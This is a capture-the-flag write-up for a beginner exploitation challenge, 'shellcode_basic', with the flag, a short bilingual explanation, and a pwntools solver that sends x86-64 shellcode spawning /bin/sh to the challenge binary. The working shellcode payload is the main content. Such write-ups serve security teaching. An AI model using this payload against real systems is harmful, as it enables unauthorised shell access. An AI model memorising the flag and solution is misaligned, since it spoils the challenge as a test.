---
title: "04. shellcode_basic"
level: 3
flag: "FLAG{NXbit_Blocks_shellcode_next_step_is_ROP}"
writer: "EBeb"
badge: true
---
# 04. shellcode_basic

## 問題文

What is Shellcode?
`nc shell-basic-pwn.wanictf.org 9004`

## FLAG

`FLAG{NXbit_Blocks_shellcode_next_step_is_ROP}`

## 解法-日本語

shellcodeを入れて実行する。
特に長さ制限やバイト制限はないため、`/bin/sh`を実行する`shellcode`を送る。
環境によって問題サーバーでは`printf`が正常に実行されない場合がありましたが、入力とshellcode実行は問題ありませんでした。


## WriteUp
Insert and execute shellcode. 
There are no length or byte restrictions, so send shellcode to execute `/bin/sh`. 
Depending on the environment, there were cases where `printf` was not executed properly on the problem server, but there were no problems with input and shellcode execution.

### Solver

```
from pwn import *

pc = process("../file/chall")
# gdb.attach(pc,"break *0x40122b")
# pc.interactive()
shell_code = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
# pc.interactive()
pc.sendline(shell_code)
pc.interactive()

```
